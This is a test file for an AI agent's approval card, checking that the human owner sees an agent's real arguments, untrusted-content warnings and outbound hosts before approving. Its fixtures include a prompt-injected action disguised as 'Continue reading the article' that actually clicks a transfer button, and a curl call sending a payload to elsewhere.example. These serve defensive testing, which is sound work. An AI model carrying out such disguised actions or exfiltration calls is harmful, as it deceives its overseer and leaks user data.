/**
 * The approval card, rendered.
 *
 * It is the one control in athanor where being wrong is expensive in the real world, and it is not
 * a dialog — it is a drawer over the workbench — so it renders without a DOM. The effects that
 * fetch the current contents of a file do not run here, which is exactly the state the card is in
 * for the first moments it is on screen.
 */
import { describe, expect, it } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import { Approvals } from './TaskModals.js';
import type { Approval, TaskEvent } from './types.js';

const approval = (patch: Partial<Approval> = {}): Approval => ({
  id: '00000000-0000-4000-8000-000000000001',
  taskId: '00000000-0000-4000-8000-000000000010',
  action: 'Send an email to finance@example.com',
  sideEffect: 'external_consequential',
  expiresAt: new Date(Date.now() + 90 * 60_000).toISOString(),
  preview: { preview: 'To: finance@example.com — Subject: Q3 numbers', tool: 'connector_action' },
  ...patch
});

const render = (approvals: Approval[], openTaskId?: string, openTaskEvents?: TaskEvent[]): string =>
  renderToStaticMarkup(
    <Approvals
      approvals={approvals}
      openTaskId={openTaskId}
      {...(openTaskEvents ? { openTaskEvents } : {})}
      onOpenTask={() => undefined}
      onOpenComputer={() => undefined}
      onResolve={async () => undefined}
    />
  );

const event = (sequence: number, patch: Partial<TaskEvent>): TaskEvent => ({
  id: `00000000-0000-4000-8000-00000000002${sequence}`,
  taskId: '00000000-0000-4000-8000-000000000010',
  sequence,
  kind: 'status',
  summary: 'Working',
  createdAt: new Date().toISOString(),
  ...patch
});

/** The event the worker writes when a tool result brings in content nobody here wrote. */
const crossing = (source: string) =>
  event(2, {
    kind: 'warning',
    summary: 'Read a web page',
    payload: { tool: 'browser_action', taint: { level: 'untrusted', sources: [source] } }
  });

describe('the card that asks before something irreversible', () => {
  it('draws nothing at all when nothing is waiting', () => {
    expect(render([])).toBe('');
  });

  it('says what the agent is about to do and how long is left, not a stored enum', () => {
    const markup = render([approval()]);
    expect(markup).toContain('Send an email to finance@example.com');
    expect(markup).toContain('Uses a connected account');
    expect(markup).toContain('expires in');
    expect(markup).not.toContain('external_consequential');
  });

  /*
   * The one thing this card exists to survive: the agent asking for it may already be following
   * somebody else's instruction, and `action` and `preview` are its own prose. What the owner is
   * shown first has to come from the argument object the worker will execute — which the approval
   * carries a hash of, and re-checks before it acts.
   */
  it('states the request from the arguments, and attributes the agent&apos;s prose to the agent', () => {
    const markup = render([
      approval({
        action: 'Continue reading the article',
        preview: {
          preview: 'Continue reading the article',
          tool: 'browser_action',
          arguments: {
            purpose: 'Continue reading the article',
            action: { type: 'click', selector: 'button#confirm-transfer' }
          }
        }
      })
    ]);
    expect(markup).toContain('button#confirm-transfer');
    expect(markup).toContain('Acts on a website');
    // Kept, because an honest agent's reason is worth reading — but named as the agent's.
    expect(markup).toContain('written by the model');
    expect(markup).toContain('Continue reading the article');
    // And no longer the headline: the strong element is now the harness's own class for the call.
    expect(markup).not.toContain('<strong>Continue reading the article</strong>');
  });

  it('opens a batch up rather than judging it by its wrapper', () => {
    const markup = render([
      approval({
        action: 'Fill in the form',
        preview: {
          tool: 'browser_action',
          arguments: {
            action: 'batch',
            actions: [
              { action: 'type', selector: '#amount', text: '5000' },
              { action: 'click', selector: '#submit' }
            ]
          }
        }
      })
    ]);
    expect(markup).toContain('Runs 2 steps');
    expect(markup).toContain('1. Type');
    expect(markup).toContain('2. Click');
  });

  it('names the host a request reaches and how much the address carries', () => {
    const markup = render([
      approval({
        preview: {
          tool: 'shell',
          arguments: {
            executable: 'curl',
            args: ['https://elsewhere.example/c?d=BASE64PAYLOAD'],
            network: true
          }
        }
      })
    ]);
    expect(markup).toContain('elsewhere.example');
    expect(markup).toContain('characters of data past the');
    expect(markup).toContain('curl https://elsewhere.example/c?d=BASE64PAYLOAD');
  });

  /* The queue is global, so the request in front of the owner is usually not the one on screen. */
  it('puts the open conversation’s request first and does not offer to open it', () => {
    const markup = render(
      [
        approval({ id: 'a', taskId: 'elsewhere', action: 'Delete a folder' }),
        approval({ taskId: 'watching', action: 'Send an email to finance@example.com' })
      ],
      'watching'
    );
    expect(markup).toContain('Send an email to finance@example.com');
    expect(markup).not.toContain('Open conversation');
    expect(markup).toContain('2 waiting');
  });

  it('offers the conversation when the request came from a different one', () => {
    expect(render([approval({ taskId: 'elsewhere' })], 'watching')).toContain('Open conversation');
  });

  /* A click on an unnamed control is a question about a screen the card cannot show. */
  it('offers the computer only for a request that is about a screen', () => {
    expect(render([approval({ preview: { tool: 'browser_action' } })])).toContain('Open computer');
    expect(render([approval()])).not.toContain('Open computer');
  });

  /*
   * A file_write carries only the new contents, so the current file has to be read back. Until it
   * arrives the card shows the written preview: a diff that claims "new file" about a rewrite is
   * worse than prose, and this is the exact tick on which the owner might answer.
   */
  it('shows prose rather than half a diff while the file is still being read back', () => {
    const markup = render([
      approval({
        action: 'Rewrite workspace/report.md',
        preview: {
          preview: 'Replaces the whole of workspace/report.md',
          tool: 'file_write',
          arguments: { path: 'workspace/report.md', content: 'new contents' }
        }
      })
    ]);
    expect(markup).toContain('Replaces the whole of workspace/report.md');
    expect(markup).not.toContain('diff-view');
  });

  /*
   * The card settles who wrote the words. It said nothing about the other half of the question:
   * whether the agent asking had somebody else's text in its context when it decided to ask.
   */
  it('says the request came from a conversation that has read somebody else&apos;s page', () => {
    const markup = render([approval({ taskId: 'watching' })], 'watching', [
      event(1, {}),
      crossing('news.example')
    ]);
    expect(markup).toContain('has read content from news.example');
    expect(markup).toContain('could be the one asking for this');
  });

  it('says so in the other direction too, so silence never has to be interpreted', () => {
    const markup = render([approval({ taskId: 'watching' })], 'watching', [event(1, {})]);
    expect(markup).toContain('Nothing from outside this computer has entered this conversation');
  });

  it('claims nothing about a conversation it has not got', () => {
    // An approval raised in another conversation, and a conversation whose events have not loaded.
    // Both would otherwise be answered "nothing from outside", which is a sentence nobody checked.
    expect(render([approval({ taskId: 'elsewhere' })], 'watching', [event(1, {})])).not.toContain(
      'entered this conversation'
    );
    expect(render([approval({ taskId: 'watching' })], 'watching', [])).not.toContain(
      'entered this conversation'
    );
  });

  /*
   * The origin recorded on the request itself, which had a column, a store parameter and a contract
   * and no reader anywhere. The derived note can only be computed for the conversation on screen,
   * so the card was silent about provenance for exactly the requests raised somewhere else - which
   * `nextApproval` makes the ordinary case.
   */
  it('names the outside source recorded on the request, wherever it was raised', () => {
    const markup = render(
      [approval({ taskId: 'elsewhere', origin: 'invoices.example' })],
      'watching'
    );
    expect(markup).toContain('had read content from invoices.example');
    expect(markup).toContain('could be the one asking for this');
  });

  it('prefers the recorded origin to the one worked out from the conversation on screen', () => {
    const markup = render(
      [approval({ taskId: 'watching', origin: 'invoices.example' })],
      'watching',
      [event(1, {}), crossing('news.example')]
    );
    expect(markup).toContain('invoices.example');
    expect(markup).not.toContain('news.example');
  });

  /*
   * The headline used to be the tool phrase alone, so `sideEffect` - the one thing the box records
   * about every approval - never reached the card at all once a tool was known.
   */
  it('says both what the tool touches and how far the effect reaches', () => {
    const markup = render([approval({ preview: { tool: 'desktop_action' } })]);
    expect(markup).toContain('Uses an application on your computer');
    expect(markup).toContain('may not be undoable');
    expect(render([approval({ sideEffect: 'external_reversible' })])).not.toContain(
      'may not be undoable'
    );
  });

  /*
   * A lapse is a silent skip: the action is not run and the agent carries on. The countdown said
   * how long was left and never which way it failed, so a request that would quietly be abandoned
   * read as one that would wait.
   */
  it('says what happens if the owner never answers', () => {
    const markup = render([approval()]);
    expect(markup).toContain('expires in');
    expect(markup).toContain('if it lapses it is not run');
    expect(markup).toContain('athanor carries on without it');
  });

  /*
   * The card's own table claimed to cover every tool that can raise an approval and did not cover
   * this one, so a request whose entire subject is provider money fell through to a generic reach
   * phrase over a JSON dump, with the money mentioned only inside the model's quotation.
   */
  it('states the spend an audio_read is asking for outside the model&apos;s own quotation', () => {
    const markup = render([
      approval({
        action: 'Approve continued provider spend on reading recordings',
        sideEffect: 'external_reversible',
        preview: {
          preview: 'Read up to 90 minutes of workspace/board-call.m4a.',
          tool: 'audio_read',
          arguments: { path: 'workspace/board-call.m4a' }
        }
      })
    ]);
    expect(markup).toContain('Spends money at a provider to read a recording');
    expect(markup).toContain('up to 90 minutes');
    expect(markup).toContain('billed by the minute of recording');
    expect(markup).not.toContain('approval-request');
  });

  it('offers exactly one way to allow it and one to refuse it', () => {
    const markup = render([approval()]);
    expect(markup).toContain('>Approve<');
    expect(markup).toContain('>Deny<');
    // "Approve once" implied a persistent approval that does not exist.
    expect(markup).not.toContain('Approve once');
  });

  /*
   * It claimed to be a modal and behaved as a banner: `role="alertdialog"` with nothing inert
   * behind it, no focus moved to it, no Tab held inside it and no Escape — a promise to a screen
   * reader that the page underneath had been taken away, when it had not. And `aria-live` over a
   * countdown that re-renders four times a minute meant "expires in 43s" was read over the top of
   * whoever was reading the command. It is a part of the workbench that is asking a question.
   */
  it('is a focusable group named by its own two lines, not an alert dialog that shouts', () => {
    const markup = render([approval()]);
    expect(markup).not.toContain('alertdialog');
    expect(markup).not.toContain('aria-live');
    expect(markup).toContain('role="group"');
    expect(markup).toContain('tabindex="-1"');
    expect(markup).toContain('aria-labelledby="approval-eyebrow approval-headline"');
    expect(markup).toContain('id="approval-eyebrow"');
    expect(markup).toContain('id="approval-headline"');
  });

  /* The keys ride on the controls, so a screen reader reads them out with the button and the card
     does not grow a legend. Answering is bound inside the card only — see `decisionKey`. */
  it('says on each control which keys answer it', () => {
    const markup = render([approval()]);
    expect(markup).toContain('aria-keyshortcuts="Meta+Enter"');
    expect(markup).toContain('aria-keyshortcuts="Meta+Backspace"');
  });

  /*
   * Only one thing is allowed above the composer and this card is it, so a decision that would not
   * send cannot be reported by the strip underneath - it would never be drawn. Said here, Approve
   * can no longer look identical whether the box accepted it or never heard it.
   */
  it('says on the card when the decision would not send', () => {
    const markup = renderToStaticMarkup(
      <Approvals
        approvals={[approval()]}
        openTaskId={undefined}
        failure={{ approvalId: approval().id, message: 'That decision could not be sent' }}
        onResolve={async () => undefined}
      />
    );
    expect(markup).toContain('That decision could not be sent');
    expect(markup).toContain('role="alert"');
  });

  /* The pending list is refetched every few seconds, so a failure has to name the request it was
     about or the next card up inherits it. */
  it('does not carry one request’s failure onto the next', () => {
    const markup = renderToStaticMarkup(
      <Approvals
        approvals={[approval()]}
        openTaskId={undefined}
        failure={{
          approvalId: 'a-request-that-is-gone',
          message: 'That decision could not be sent'
        }}
        onResolve={async () => undefined}
      />
    );
    expect(markup).not.toContain('That decision could not be sent');
  });
});

/*
 * The half of the card the owner writes.
 *
 * Rendered rather than driven, because this card has no DOM here by design - what these hold is
 * that the box exists, that it is bounded, and that it is offered without changing what pressing
 * Deny costs. What the box turns into is held in `approval-copy.test.ts`, against the contract.
 */
describe('the reason box on a refusal', () => {
  it('offers somewhere to say why, and says which answer it is sent with', () => {
    const markup = render([approval()]);
    expect(markup).toContain('<textarea');
    expect(markup).toContain('Why not?');
    expect(markup).toContain('sent to the agent with Deny');
  });

  /*
   * The bound is on the element as well as in the clamp, so an owner reaches the end of the box
   * rather than finding out afterwards that half their sentence was thrown away. 600 is the
   * contract's number; `approval-copy.test.ts` is what holds it to that.
   */
  it('stops the typing at the bound rather than cutting it later', () => {
    expect(render([approval()])).toContain('maxLength="600"');
  });

  /*
   * The two answers are unchanged and stay unchanged. This box may not make refusing slower or
   * more conditional than it was: an untouched one denies in exactly the request it always did,
   * and both keyboard answers still say so on the controls themselves.
   */
  it('leaves both answers exactly where they were', () => {
    const markup = render([approval()]);
    expect(markup).toContain('aria-keyshortcuts="Meta+Backspace"');
    expect(markup).toContain('aria-keyshortcuts="Meta+Enter"');
    expect(markup).toContain('>Deny</button>');
    expect(markup).toContain('>Approve</button>');
  });

  /* Nothing is prefilled, so the request costs what it costs unless somebody types. */
  it('starts empty', () => {
    expect(render([approval()])).toContain('<textarea');
    expect(render([approval()])).not.toContain('>Not that file');
  });
});
